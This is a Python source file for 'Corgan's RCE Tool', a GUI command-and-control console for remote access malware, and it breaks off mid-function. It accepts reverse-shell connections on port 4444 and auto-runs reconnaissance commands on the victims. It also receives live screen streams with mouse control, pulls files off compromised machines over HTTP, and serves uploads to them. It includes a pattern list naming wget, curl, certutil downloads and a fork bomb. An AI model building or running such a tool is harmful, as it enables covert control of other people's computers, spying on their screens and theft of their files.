# Attacker.py
import customtkinter as ctk
import subprocess
import threading
import platform
import re
import os
import time
import socket
import base64
import shutil
import zipfile
import psutil
import json
from PIL import Image, ImageTk
import cv2
import numpy as np
import struct
from tkinter import scrolledtext, filedialog, messagebox, simpledialog
from datetime import datetime, timedelta    
from io import BytesIO
from http.server import SimpleHTTPRequestHandler, HTTPServer
import requests

WindowWidth = 200  # Default width
WindowHeight = 200  # Default height


# Set up the server
def start_server():
        # Get the path to the Documents folder
    documents_path = os.path.expanduser('~\\Documents')

    # Create a new folder inside Documents
    folder_name = "Uploader"
    new_folder_path = os.path.join(documents_path, folder_name)

    # Create the folder if it doesn't exist
    if not os.path.exists(new_folder_path):
        os.makedirs(new_folder_path)

    # Change the working directory to the new folder
    os.chdir(new_folder_path)
    server_address = ('', 8000)
    httpd = HTTPServer(server_address, SimpleHTTPRequestHandler)
    print("Server started on port 8000...")
    httpd.serve_forever()

CHUNK_SIZE = 1024 * 1

ctk.set_appearance_mode("Dark")
ctk.set_default_color_theme("blue")

class NcatGUI(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("Corgan's RCE Tool")
        self.geometry("1280x720")

        self.listeners = {}
        self.connection_count = 0
        self.active_connections = []
        self.main_listener = None
        self.connection_sockets = {}
        self.client_width = 100  # Default values
        self.client_height = 100
        self.stream_scale_x = 1.0  # Initialize scaling factors
        self.stream_scale_y = 1.0
        self.connection_info = {}
        self.auto_command_history = {}
        self.command_history = {}
        self.stream_windows = {}  # Track open stream windows
        self.settings = {
            "auto_commands": False,
            "notifications": True,
            "command_confirmation": True,
            "auto_save_logs": False,
            "theme_color": "green",
            "timeout": 30
        }

        # Screen streaming components
        self.screen_frame = None
        self.video_label = None
        self.streaming_active = False
        self.screen_socket = None

        # Configure grid layout
        self.grid_columnconfigure(0, weight=1)
        self.grid_rowconfigure(1, weight=1)
        self.grid_rowconfigure(2, weight=0)
        self.grid_rowconfigure(3, weight=0)

        # Header frame
        self.header_frame = ctk.CTkFrame(self, corner_radius=0)
        self.header_frame.grid(row=0, column=0, sticky="nsew")
        
        self.port_entry = ctk.CTkEntry(self.header_frame, placeholder_text="Port", width=120)
        self.port_entry.pack(side="left", padx=10, pady=10)
        self.port_entry.insert(0, "4444")

        self.ip_entry = ctk.CTkEntry(self.header_frame, placeholder_text="Interface", width=150)
        self.ip_entry.pack(side="left", padx=10, pady=10)
        self.ip_entry.insert(0, "0.0.0.0")

        self.start_btn = ctk.CTkButton(self.header_frame, text="Start Listener",
                                     command=self.start_main_listener, fg_color="#2AAA8A", hover_color="#228B69")
        self.start_btn.pack(side="left", padx=10, pady=10)

        self.stop_btn = ctk.CTkButton(self.header_frame, text="Stop All",
                                    command=self.stop_all_listeners, fg_color="#FF4B4B", hover_color="#CC3D3D",
                                    state="disabled")
        self.stop_btn.pack(side="left", padx=10, pady=10)

        self.connection_label = ctk.CTkLabel(self.header_frame, text="Active: 0")
        self.connection_label.pack(side="left", padx=20, pady=10)

        # Tab view
        self.tabview = ctk.CTkTabview(self)
        self.tabview.grid(row=1, column=0, sticky="nsew", padx=10, pady=10)
        self.tabview.add("Main Listener")
        self.current_tab = "Main Listener"
        self.last_selected_tab = self.tabview.get()

        # Input frame
        self.input_frame = ctk.CTkFrame(self)
        self.input_frame.grid(row=2, column=0, sticky="ew", padx=10, pady=(0, 10))
        self.input_frame.grid_columnconfigure(0, weight=1)

        self.cmd_entry = ctk.CTkEntry(self.input_frame, placeholder_text="Enter command...")
        self.cmd_entry.grid(row=0, column=0, padx=10, pady=10, sticky="ew")
        self.cmd_entry.bind("<Return>", self.send_command)
        self.cmd_entry.bind("<Up>", self.previous_command)
        self.cmd_entry.bind("<Down>", self.next_command)

        self.send_btn = ctk.CTkButton(self.input_frame, text="Send", command=self.send_command, width=100)
        self.send_btn.grid(row=0, column=1, padx=10, pady=10)

        self.history_btn = ctk.CTkButton(self.input_frame, text="↑ History", command=self.show_command_history, width=100)
        self.history_btn.grid(row=0, column=2, padx=10, pady=10)

        # Status bar
        self.status_bar = ctk.CTkLabel(self, text="🛑 Not Running", fg_color=("white", "#2d2d2d"), anchor="w")
        self.status_bar.grid(row=3, column=0, sticky="nsew")

        # Initialize components
        self.init_main_console()
        self.check_tab_timer()
        self.start_screen_streamer()

    def update_scaling_factors(self, display_width, display_height):
        try:
            # 1. Get actual client resolution from connection data
            client_width = self.client_width
            client_height = self.client_height
        
            # 2. Aspect ratio preservation
            display_ratio = display_width / display_height
            client_ratio = client_width / client_height
        
            # 3. Adaptive scaling calculation
            if abs(display_ratio - client_ratio) < 0.01:  # Similar aspect ratios
                self.stream_scale_x = 1920 / display_width
                self.stream_scale_y = 1080 / display_height
            else:  # Different aspect ratios (letterbox compensation)
                scale = min(1920/display_width, 1080/display_height)
                self.stream_scale_x = scale
                self.stream_scale_y = scale
                self.offset_x = (1920 - (display_width * scale)) / 2
                self.offset_y = (1080 - (display_height * scale)) / 2
            
        except ZeroDivisionError:
            print("Error: Display dimensions cannot be zero")
        except KeyError:
            print("Error: No resolution data for current connection")

    def on_mouse_click(self, event, connection_name):
        # Get actual display dimensions of video feed
        display_width = event.widget.winfo_width()
        display_height = event.widget.winfo_height()
    
        # Update scaling factors
        self.update_scaling_factors(display_width, display_height)
    
        # Scale coordinates
        scaled_x = int(event.x * self.stream_scale_x)
        scaled_y = int(event.y * self.stream_scale_y)
    
        # Send command to client
        self.send_specific_command(f"mouse_move {scaled_x} {scaled_y}", connection_name)


    # Modified window creation with component tracking
    def start_connection_screen_stream(self, connection_name):
        print(f"Starting screen share for {connection_name}")
        if connection_name in self.stream_windows:
            if self.stream_windows[connection_name].winfo_exists():
                self.stream_windows[connection_name].lift()
                return
            
        # Send stream initiation command
        self.send_specific_command("start_stream", connection_name)

        # Wait 0.1 seconds
        time.sleep(0.1)

        stream_window = ctk.CTkToplevel(self)
        stream_window.title(f"Screen Share - {connection_name}")
    


        stream_window.geometry(str(WindowWidth) + "x" + str(WindowHeight))
    
        video_frame = ctk.CTkFrame(stream_window)
        video_frame.pack(fill="both", expand=True, padx=10, pady=10)
    
        video_label = ctk.CTkLabel(video_frame, text="")
        video_label.pack(fill="both", expand=True)
        video_label.bind("<Button-1>", lambda event: self.on_mouse_click(event, connection_name))
    
        # Store reference to video label
        stream_window.video_label = video_label
        self.stream_windows[connection_name] = stream_window

    def on_stream_close(self, connection_name):
        print(f"Stream window closed for {connection_name}")
        if connection_name in self.stream_windows:
            if self.stream_windows[connection_name].winfo_exists():
                self.stream_windows[connection_name].destroy()
            del self.stream_windows[connection_name]

    def start_screen_streamer(self):
        print("Starting screen streaming")
        if not self.streaming_active:
            self.streaming_active = True
            self.screen_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.screen_socket.bind(('0.0.0.0', 5001))
            self.screen_socket.listen(1)
            threading.Thread(target=self.screen_stream_handler, daemon=True).start()
            self.log_message("Main Listener", "Screen stream server started on port 5001", "success")

    def stop_screen_streamer(self):
        print("Stopping screen streaming")
        if self.streaming_active:
            self.streaming_active = False
            if self.screen_socket:
                self.screen_socket.close()
            self.log_message("Main Listener", "Screen streaming stopped", "warning")

    # Improved error handling in streaming components
    def screen_stream_handler(self):
        print("Screen stream handler started")
        while self.streaming_active:
            try:
                conn, addr = self.screen_socket.accept()

                threading.Thread(
                    target=self.receive_screen_frames,
                    args=(conn,),
                    daemon=True
                ).start()
            except Exception as e:
                if self.streaming_active:
                    self.log_message("Main Listener", 
                        f"Screen stream error: {str(e)}", "error")

    def receive_screen_frames(self, conn):
        print("Receiving screen frames")
        try:
            client_ip = conn.getpeername()[0]
            connection_name = self.get_connection_name_by_ip(client_ip)
        
            while self.streaming_active and connection_name:
            
                

                header = conn.recv(4)
                if len(header) != 4: break
                
                size = struct.unpack('!I', header)[0]
                data = b''
                while len(data) < size and self.streaming_active:
                    chunk = conn.recv(size - len(data))
                    if not chunk: break
                    data += chunk
                
                frame = cv2.imdecode(np.frombuffer(data, np.uint8), cv2.IMREAD_COLOR)
                if frame is not None:
                    self.update_stream_display(frame, connection_name)
        except Exception as e:
            self.log_message("Screen Stream", f"Stream error: {str(e)}", "error")

        finally:
            conn.close()

    def move_mouse(self, x, y):
        try:
            if platform.system() == "Windows":
                import ctypes
                ctypes.windll.user32.SetCursorPos(x, y)
        except Exception as e:
            self.log_message("Main Listener", f"Error moving mouse: {str(e)}", "error")

    def update_stream_display(self, frame, connection_name):
        if connection_name not in self.stream_windows:
            return

        stream_window = self.stream_windows[connection_name]
        if not stream_window.winfo_exists():
            return

        video_label = stream_window.video_label
        rgb_frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        img = Image.fromarray(rgb_frame)
        imgtk = ImageTk.PhotoImage(image=img)
        video_label.configure(image=imgtk)
        video_label.image = imgtk

    def get_connection_name_by_ip(self, client_ip):
        for name, info in self.connection_info.items():
            if info["ip"] == client_ip:
                return name
        return None




    def check_tab_timer(self):
        self.get_current_tab()
        self.after(500, self.check_tab_timer)

    def get_current_tab(self):
        try:
            current = self.tabview.get()
            if current != self.last_selected_tab:
                self.log_message("Main Listener", f"Switched to tab: {current}", "system")
                self.current_tab = current
                self.last_selected_tab = current
                self.update_input_state()
                self.cmd_history_index = -1
        except Exception as e:
            print(f"Error checking tab change: {str(e)}")

    def update_input_state(self):
        if self.current_tab == "Main Listener":
            self.cmd_entry.configure(state="disabled")
            self.send_btn.configure(state="disabled")
            self.history_btn.configure(state="disabled")
        else:
            is_active = self.current_tab in self.active_connections and self.listeners.get(self.current_tab, {}).get("running", False)
            state = "normal" if is_active else "disabled"
            self.cmd_entry.configure(state=state)
            self.send_btn.configure(state=state)
            self.history_btn.configure(state=state)

    def init_main_console(self):
        main_tab = self.tabview.tab("Main Listener")
        console = scrolledtext.ScrolledText(main_tab, wrap="word", bg="#1a1a1a", fg="#00FF00",
                                           insertbackground="#00FF00")
        console.pack(fill="both", expand=True, padx=10, pady=10)
        console.tag_config("success", foreground="#2AAA8A")
        console.tag_config("error", foreground="#FF4B4B")
        console.tag_config("info", foreground="#00FF00")
        console.tag_config("connection", foreground="#FFD700")
        console.tag_config("system", foreground="#BA55D3")
        console.tag_config("warning", foreground="#FFA500")
        self.listeners["Main Listener"] = {
            "console": console,
            "process": None,
            "thread": None,
            "running": False,
            "buffer": []
        }

    def start_main_listener(self):
        if not self.validate_inputs():
            return

        if not self.listeners["Main Listener"]["running"]:
            self.connection_count = 0
            self.active_connections = []
            self.update_connection_counter()

        self.start_btn.configure(state="disabled")
        self.stop_btn.configure(state="normal")
        self.update_status("🟢 Starting main listener...")

        for name in list(self.listeners.keys()):
            if name != "Main Listener" and name not in self.active_connections:
                try:
                    self.tabview.delete(name)
                    del self.listeners[name]
                except:
                    pass

        self.main_listener = threading.Thread(target=self.run_main_listener, daemon=True)
        self.main_listener.start()

    def init_main_console(self):
        main_tab = self.tabview.tab("Main Listener")
        console = scrolledtext.ScrolledText(main_tab, wrap="word", bg="#1a1a1a", fg="#00FF00",
                                           insertbackground="#00FF00")
        console.pack(fill="both", expand=True, padx=10, pady=10)
        console.tag_config("success", foreground="#2AAA8A")
        console.tag_config("error", foreground="#FF4B4B")
        console.tag_config("info", foreground="#00FF00")
        console.tag_config("connection", foreground="#FFD700")
        console.tag_config("system", foreground="#BA55D3")
        console.tag_config("warning", foreground="#FFA500")
        self.listeners["Main Listener"] = {
            "console": console,
            "process": None,
            "thread": None,
            "running": False,
            "buffer": []
        }

    def check_tab_timer(self):
        self.get_current_tab()
        self.after(500, self.check_tab_timer)

    def get_current_tab(self):
        try:
            current = self.tabview.get()
            if current != self.last_selected_tab:
                self.log_message("Main Listener", f"Switched to tab: {current}", "system")
                self.current_tab = current
                self.last_selected_tab = current
                self.update_input_state()
                self.cmd_history_index = -1
        except Exception as e:
            print(f"Error checking tab change: {str(e)}")

    def update_input_state(self):
        if self.current_tab == "Main Listener" or self.current_tab == "Screen Stream":
            self.cmd_entry.configure(state="disabled")
            self.send_btn.configure(state="disabled")
            self.history_btn.configure(state="disabled")
        else:
            is_active = self.current_tab in self.active_connections and self.listeners.get(self.current_tab, {}).get("running", False)
            state = "normal" if is_active else "disabled"
            self.cmd_entry.configure(state=state)
            self.send_btn.configure(state=state)
            self.history_btn.configure(state=state)

    def start_main_listener(self):
        if not self.validate_inputs():
            return

        if not self.listeners["Main Listener"]["running"]:
            self.connection_count = 0
            self.active_connections = []
            self.update_connection_counter()

        self.start_btn.configure(state="disabled")
        self.stop_btn.configure(state="normal")
        self.update_status("🟢 Starting main listener...")

        for name in list(self.listeners.keys()):
            if name != "Main Listener" and name not in self.active_connections:
                try:
                    self.tabview.delete(name)
                    del self.listeners[name]
                except:
                    pass

        self.main_listener = threading.Thread(target=self.run_main_listener, daemon=True)
        self.main_listener.start()

    def run_main_listener(self):
        port = int(self.port_entry.get())
        host = self.ip_entry.get()

        try:
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server_socket.bind((host, port))
            server_socket.listen(5)
            server_socket.settimeout(0.5)

            self.listeners["Main Listener"]["process"] = server_socket
            self.listeners["Main Listener"]["running"] = True
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            status_msg = f"🟢 Listening on {host}:{port}"
            self.update_status(status_msg)
            self.log_message("Main Listener", f"[{timestamp}] {status_msg}", "success")

            while self.listeners["Main Listener"]["running"]:
                try:
                    client_socket, address = server_socket.accept()
                    client_address = f"{address[0]}:{address[1]}"
                    self.handle_new_connection(client_socket, client_address)

                    if self.settings["notifications"]:
                        self.show_notification(f"New connection from {client_address}")

                except socket.timeout:
                    continue
                except Exception as e:
                    if self.listeners["Main Listener"]["running"]:
                        self.log_message("Main Listener", f"Error accepting connection: {str(e)}", "error")

            server_socket.close()
            return True

        except Exception as e:
            self.log_message("Main Listener", f"Error starting listener: {str(e)}", "error")
            self.stop_all_listeners()
            return False

    def handle_new_connection(self, client_socket, address):
        self.connection_count += 1
        connection_name = f"Connection {self.connection_count}"
        self.active_connections.append(connection_name)
        self.update_connection_counter()
        self.connection_sockets[connection_name] = client_socket
        client_socket.settimeout(self.settings["timeout"])

        self.connection_info[connection_name] = {
            "address": address,
            "ip": address.split(":")[0],
            "connected_time": datetime.now(),
            "os_type": "Unknown",
            "username": "Unknown",
            "hostname": "Unknown",
            "last_active": datetime.now(),
            "commands_sent": 0,
        }
        self.auto_command_history[connection_name] = []
        self.after(0, lambda: self.create_connection_tab(connection_name))
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.log_message("Main Listener", f"[{timestamp}] 📡 New {connection_name}: Connection from {address}", "connection")
        self.after(100, lambda: self.log_message(connection_name, f"[{timestamp}] 📡 Connection established from {address}", "success"))
        self.after(200, lambda: self.tabview.set(connection_name))
        reader_thread = threading.Thread(target=self.read_from_connection, args=(connection_name, client_socket), daemon=True)
        reader_thread.start()

        if self.settings["auto_commands"]:
            self.after(500, lambda: self.run_auto_commands(connection_name))

    def run_auto_commands(self, connection_name):
        basic_commands = [
            "whoami",
            "hostname",
            "ipconfig",
            "systeminfo",
            "start_stream"
        ]

        for i, cmd in enumerate(basic_commands):
            delay = i * 500
            self.after(delay, lambda c=cmd: self.send_specific_command(c, connection_name))

    def read_from_connection(self, connection_name, client_socket):
        client_socket.setblocking(0)
        buffer = b""

        try:
            while connection_name in self.active_connections and self.listeners.get(connection_name, {}).get("running", False):
                try:
                    data = client_socket.recv(4096)
                    if not data:
                        raise Exception("Connection closed by remote host")

                    buffer += data

                    if connection_name in self.connection_info:
                        self.connection_info[connection_name]["last_active"] = datetime.now()

                    if b'\n' in buffer:
                        lines = buffer.split(b'\n')
                        buffer = lines.pop(-1)
                        for line in lines:
                            try:
                                line_str = line.decode('utf-8', errors='replace').strip()
                                if line_str:
                                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                                    self.after(0, lambda l=line_str, t=timestamp:
                                              self.log_message(connection_name, f"[{t}] {l}", "info"))
                                    self.extract_system_info(connection_name, line_str)
                                    self.Listen_for_Resolutions(connection_name, line_str)

                            except:
                                pass

                except BlockingIOError:
                    time.sleep(0.1)
                except Exception as e:
                    if "Connection closed" in str(e):
                        self.after(0, lambda: self.log_message(connection_name, "Connection closed by remote host", "error"))
                    else:
                        self.after(0, lambda: self.log_message(connection_name, f"Error reading from socket: {str(e)}", "error"))
                    break

        except Exception as e:
            self.after(0, lambda: self.log_message(connection_name, f"Connection error: {str(e)}", "error"))
        finally:
            try:
                client_socket.close()
            except:
                pass

            if connection_name in self.active_connections:
                self.after(0, lambda: self.close_connection(connection_name))

    def extract_system_info(self, connection_name, line):
        if connection_name not in self.connection_info:
            return

        info = self.connection_info[connection_name]

        info["os_type"] = "Windows"

        if line.strip() and len(line.strip()) < 50 and self.is_last_command(connection_name, "whoami"):
            info["username"] = line.strip()

        if line.strip() and len(line.strip()) < 50 and self.is_last_command(connection_name, "hostname"):
            info["hostname"] = line.strip()

        self.update_connection_info_ui(connection_name)

    def Listen_for_Resolutions(self, connection_name, line):
        if connection_name not in self.connection_info:
            return 

        if line.strip() and len(line.strip()) < 50 and self.is_last_command(connection_name, "start_stream"):

            Resolution = line.strip()
            # Example 1920:1080

            Resolution = Resolution.split(":")
            Width = Resolution[0]
            Height = Resolution[1]


            global WindowWidth, WindowHeight
            WindowWidth = int(Width)
            WindowHeight = int(Height)
            self.client_width = int(Width)
            self.client_height = int(Height)
            print(f"Width: {Width} Height: {Height}")


    def is_last_command(self, connection_name, command):
        if connection_name in self.auto_command_history and self.auto_command_history[connection_name]:
            return self.auto_command_history[connection_name][-1].lower() == command.lower()
        return False

    def update_connection_info_ui(self, connection_name):
        if connection_name not in self.listeners or connection_name not in self.connection_info:
            return

        info = self.connection_info[connection_name]

        if "info_label" in self.listeners[connection_name]:
            label = self.listeners[connection_name]["info_label"]
            connected_time = info["connected_time"].strftime("%Y-%m-%d %H:%M:%S")
            duration = datetime.now() - info["connected_time"]
            hours, remainder = divmod(duration.seconds, 3600)
            minutes, seconds = divmod(remainder, 60)
            duration_str = f"{hours}h {minutes}m {seconds}s"

            info_text = (
                f"📌 Connection Info:\n"
                f"Address: {info['address']}\n"
                f"OS: {info['os_type']}\n"
                f"User: {info['username']}\n"
                f"Host: {info['hostname']}\n"
                f"Connected: {connected_time} ({duration_str})\n"
                f"Commands: {info['commands_sent']}\n"
            )
            label.configure(text=info_text)

    def create_connection_tab(self, connection_name):
        self.tabview.add(connection_name)
        tab = self.tabview.tab(connection_name)
        main_frame = ctk.CTkFrame(tab)
        main_frame.pack(fill="both", expand=True)
        main_frame.grid_columnconfigure(1, weight=1)
        main_frame.grid_rowconfigure(0, weight=1)

        info_frame = ctk.CTkFrame(main_frame, width=200)
        info_frame.grid(row=0, column=0, sticky="nsew", padx=5, pady=5)
        info_label = ctk.CTkLabel(
            info_frame,
            text="📌 Connection Info:\nLoading...",
            justify="left",
            anchor="w",
            padx=10,
            pady=10,
            height=200
        )
        info_label.pack(fill="x", padx=5, pady=5)
        self.listeners[connection_name] = {}
        self.listeners[connection_name]["info_label"] = info_label
        self.update_connection_info_ui(connection_name)
        actions_frame = ctk.CTkFrame(info_frame)
        actions_frame.pack(fill="x", padx=5, pady=5)

        upload_btn = ctk.CTkButton(
            actions_frame,
            text="📤 Upload File",
            command=lambda: self.upload_file_dialog(connection_name)
        )
        upload_btn.pack(fill="x", padx=5, pady=5)

        download_btn = ctk.CTkButton(
            actions_frame,
            text="📥 Download File",
            command=lambda: self.download_file_dialog(connection_name)
        )
        download_btn.pack(fill="x", padx=5, pady=5)

        # Add Screen Share button
        screen_btn = ctk.CTkButton(
            actions_frame,
            text="📺 Screen Share",
            command=lambda cn=connection_name: self.start_connection_screen_stream(cn)
        )
        screen_btn.pack(fill="x", padx=5, pady=5)


        console_frame = ctk.CTkFrame(main_frame)
        console_frame.grid(row=0, column=1, sticky="nsew", padx=5, pady=5)
        console_frame.grid_rowconfigure(0, weight=1)
        console_frame.grid_columnconfigure(0, weight=1)
        console_fg_color = self.get_theme_color()
        console = scrolledtext.ScrolledText(console_frame, wrap="word", bg="#1a1a1a", fg=console_fg_color,
                                          insertbackground=console_fg_color)
        console.grid(row=0, column=0, sticky="nsew", padx=5, pady=5)
        console.tag_config("success", foreground="#2AAA8A")
        console.tag_config("error", foreground="#FF4B4B")
        console.tag_config("info", foreground=console_fg_color)
        console.tag_config("input", foreground="#FF9900")
        console.tag_config("system", foreground="#BA55D3")
        console.tag_config("warning", foreground="#FFA500")
        cmd_frame = ctk.CTkFrame(main_frame)
        cmd_frame.grid(row=1, column=0, columnspan=2, sticky="ew", padx=5, pady=5)
        cmd_frame.grid_columnconfigure(0, weight=1)

        quick_cmds = [
            ("Dir", "dir"),
            ("Tasklist", "tasklist"),
            ("Systeminfo", "systeminfo"),
            ("IPConfig", "ipconfig"),
            ("Whoami", "whoami"),
            ("Net User", "net user"),
            ("Netstat", "netstat -ano"),
            ("Services", "sc query"),
            ("Drivers", "driverquery"),
            ("Processes", "tasklist /v"),
            ("Firewall", "netsh advfirewall show currentprofile"),
            ("Net Share", "net share"),
            ("Routing", "route print"),
            ("ARP Table", "arp -a")
        ]

        for i, (label, cmd) in enumerate(quick_cmds):
            btn = ctk.CTkButton(cmd_frame, text=label, width=100,
                              command=lambda c=cmd, cn=connection_name: self.send_specific_command(c, cn))
            btn.grid(row=0, column=i, padx=5, pady=2, sticky="ew")

        num_cmds = len(quick_cmds)
        for i in range(num_cmds):
            cmd_frame.grid_columnconfigure(i, weight=1)

        self.listeners[connection_name].update({
            "console": console,
            "process": None,
            "thread": None,
            "running": True,
            "buffer": [],
        })

    def send_specific_command(self, command, connection_name):
        if not command or connection_name not in self.listeners:
            return False

        if not self.listeners[connection_name].get("running", False):
            self.log_message(connection_name, "Cannot send command: Connection is not active", "error")
            return False

        if self.settings["command_confirmation"] and self.is_dangerous_command(command):
            result = messagebox.askyesno(
                "Dangerous Command",
                f"The command '{command}' may be dangerous to execute. Continue?",
                parent=self
            )
            if not result:
                self.log_message(connection_name, f"Command cancelled: {command}", "warning")
                return False

        socket_obj = self.connection_sockets.get(connection_name)
        if not socket_obj:
            self.log_message(connection_name, "Cannot send command: Socket not found", "error")
            return False

        try:
            if not command.endswith('\n'):
                command += '\n'
            socket_obj.send(command.encode('utf-8'))
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            self.log_message(connection_name, f"[{timestamp}] $ {command.strip()}", "input")

            if connection_name in self.connection_info:
                self.connection_info[connection_name]["commands_sent"] += 1
                self.connection_info[connection_name]["last_active"] = datetime.now()
                self.update_connection_info_ui(connection_name)

            if connection_name not in self.auto_command_history:
                self.auto_command_history[connection_name] = []
            self.auto_command_history[connection_name].append(command.strip())

            return True

        except Exception as e:
            self.log_message(connection_name, f"Error sending command: {str(e)}", "error")
            return False

    def is_dangerous_command(self, command):
        dangerous_patterns = [
            "rm -rf", "rmdir /s", "format", "mkfs", "del /f", "deltree",
            "shutdown", "reboot", ":(){:|:&};:", "dd if=/dev/zero",
            "> /dev/sda", "mv /* /dev/null", "wget", "curl", "chmod 777",
            "attrib -r", "cacls /g everyone:f", "wget http", "curl http",
            "powershell", "powershell.exe", "base64 -d",
            "rundll32.exe", "regsvr32", "certutil -urlcache"
        ]

        cmd_lower = command.lower()
        return any(pattern.lower() in cmd_lower for pattern in dangerous_patterns)

    def close_connection(self, connection_name):
        if connection_name not in self.listeners:
            return

        try:
            if connection_name in self.connection_sockets:
                socket_obj = self.connection_sockets[connection_name]
                socket_obj.close()
                del self.connection_sockets[connection_name]
            self.listeners[connection_name]["running"] = False
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            self.log_message(connection_name, f"[{timestamp}] Connection closed", "error")
            self.log_message("Main Listener", f"[{timestamp}] Connection closed: {connection_name}", "error")

            if connection_name in self.active_connections:
                self.active_connections.remove(connection_name)
            self.update_connection_counter()
            self.update_input_state()

        except Exception as e:
            self.log_message(connection_name, f"Error closing connection: {str(e)}", "error")

    def upload_file_dialog(self, connection_name):
        if connection_name not in self.listeners or not self.listeners[connection_name].get("running", False):
            messagebox.showerror("Error", "Connection is not active", parent=self)
            return

        local_path = filedialog.askopenfilename(
            title="Select File to Upload",
            parent=self
        )
        if not local_path:
            return
        
        file_name = os.path.basename(local_path)
        
        documents_path = os.path.expanduser('~\\Documents')

        # Create a new folder inside Documents
        folder_name = "Uploader"
        new_folder_path = os.path.join(documents_path, folder_name)
        shutil.copy(local_path, os.path.join(new_folder_path, file_name))
        local_path = os.path.join(new_folder_path, file_name)
        file_name_remote = os.path.basename(local_path)
        threading.Thread(target=self.upload_file, args=(connection_name, local_path, file_name_remote), daemon=True).start()

    def upload_file(self, connection_name, local_path, file_name_remote):
        try:
            self.send_specific_command(f"download {file_name_remote}", connection_name)
        except Exception as e:
            self.log_message(connection_name, f"Error uploading file: {str(e)}", "error")

    def download_file_dialog(self, connection_name):
        if connection_name not in self.listeners or not self.listeners[connection_name].get("running", False):
            messagebox.showerror("Error", "Connection is not active", parent=self)
            return

        remote_path = ctk.CTkInputDialog(
            text="Enter path of file to download from remote system:",
            title="Download Source"
        ).get_input()
    
        if not remote_path:
            return
    
        local_path = filedialog.asksaveasfilename(
            title="Save File As",
            defaultextension=".*",
            initialfile=os.path.basename(remote_path),
            parent=self
        )
    
        if not local_path:
            return
        
        threading.Thread(target=self.download_file,
                         args=(connection_name, remote_path, local_path),
                         daemon=True).start()

    def download_file(self, connection_name, remote_path, local_path):
        self.send_specific_command(f"upload {remote_path}", connection_name)
        if connection_name not in self.connection_info:
            self.log_message(connection_name, "Connection information not found", "error")
            return

        ip_address = self.connection_info[connection_name]["ip"]
        self.log_message(connection_name, f"Attempting to download from IP: {ip_address}", "info")

        file_name = os.path.basename(remote_path)
        file_name = file_name.replace("\\", "")
        file_name = requests.utils.quote(file_name)

        url = f"http://{ip_address}:8080/{file_name}"
        self.log_message(connection_name, f"Download URL: {url}", "info")

        try:
            response = requests.get(url, stream=True)
            if response.status_code == 200:
                with open(local_path, 'wb') as f:
                    for chunk in response.iter_content(chunk_size=8192):
                        f.write(chunk)
                self.log_message(connection_name, f"File downloaded successfully: {local_path}", "success")
            else:
                self.log_message(connection_name, f"Failed to download file: HTTP {response.status_code}", "error")
        except Exception as e:
            self.log_message(connection_name, f"Error downloading file: {str(e)}", "error")

    def send_command(self, event=None):
        command = self.cmd_entry.get()
        if command:
            if self.current_tab != "Main Listener" and self.current_tab != "Screen Stream":
                if self.send_specific_command(command, self.current_tab):
                    self.cmd_entry.delete(0, "end")
                    self.update_command_history(self.current_tab, command)

    def update_command_history(self, connection_name, command):
        if connection_name not in self.command_history:
            self.command_history[connection_name] = []
        self.command_history[connection_name].append(command)
        self.cmd_history_index = -1

    def previous_command(self, event=None):
        if self.current_tab != "Main Listener" and self.current_tab != "Screen Stream":
            if self.current_tab in self.command_history:
                if self.cmd_history_index < len(self.command_history[self.current_tab]) - 1:
                    self.cmd_history_index += 1
                    self.cmd_entry.delete(0, ctk.END)
                    self.cmd_entry.insert(0, self.command_history[self.current_tab][self.cmd_history_index])
                    self.cmd_entry.icursor(ctk.END)

    def next_command(self, event=None):
        if self.current_tab != "Main Listener" and self.current_tab != "Screen Stream":
            if self.current_tab in self.command_history:
                history = self.command_history[self.current_tab]
                if self.cmd_history_index >= 0 and self.cmd_history_index < len(history) -1:
                    self.cmd_history_index += 1
                    self.cmd_entry.delete(0, ctk.END)
                    self.cmd_entry.insert(0, history[self.cmd_history_index])
                    self.cmd_entry.icursor(ctk.END)
                elif self.cmd_history_index == len(history) - 1:
                    self.cmd_history_index = -1
                    self.cmd_entry.delete(0, ctk.END)

    def show_command_history(self):
        if self.current_tab != "Main Listener" and self.current_tab != "Screen Stream":
            if self.current_tab in self.command_history:
                history_str = "\n".join(reversed(self.command_history[self.current_tab]))
                messagebox.showinfo("Command History", history_str, parent=self)
            else:
                messagebox.showinfo("Command History", "No commands in history yet.", parent=self)

    def stop_all_listeners(self):
        self.start_btn.configure(state="normal")
        self.stop_btn.configure(state="disabled")
        self.update_status("🛑 Stopped")
        try:
            if self.main_listener:
                self.listeners["Main Listener"]["running"] = False
                if self.listeners["Main Listener"]["process"]:
                    self.listeners["Main Listener"]["process"].close()
                self.main_listener = None
        except Exception as e:
            self.log_message("Main Listener", f"Error stopping main listener: {e}", "error")

        for connection_name in list(self.active_connections):
            self.close_connection(connection_name)

        self.active_connections = []

    def validate_inputs(self):
        try:
            port = int(self.port_entry.get())
            if not 1 <= port <= 65535:
                messagebox.showerror("Error", "Invalid port number. Port must be between 1 and 65535.")
                return False

            try:
                socket.inet_aton(self.ip_entry.get())
            except socket.error:
                messagebox.showerror("Error", "Invalid IP address format.")
                return False

        except ValueError:
            messagebox.showerror("Error", "Invalid port number. Must be an integer.")
            return False
        return True

    def update_status(self, message):
        self.status_bar.configure(text=message)


    def log_message(self, listener_name, message, tag=None):
        if listener_name in self.listeners:
            console = self.listeners[listener_name]["console"]
            console.configure(state="normal")
            console.insert("end", message + "\n")
            if tag:
                console.tag_add(tag, "end-1c linestart", "end-1c lineend")
            console.see("end")
            console.configure(state="disabled")

    def get_theme_color(self):
        return {
            "green": "#00FF00",
            "blue": "#5C9DFF",
            "red": "#FF4B4B",
        }.get(self.settings.get("theme_color", "green"), "#00FF00")

    def save_logs(self):
        log_data = {}
        for listener_name, listener_data in self.listeners.items():
            console_content = listener_data['console'].get("1.0", "end-1c")
            log_data[listener_name] = console_content

        if not log_data:
            messagebox.showinfo("Save Logs", "No logs to save.")
            return

        save_options = [
            ("Consolidated Log", "consolidated"),
            ("Separate Logs", "separate"),
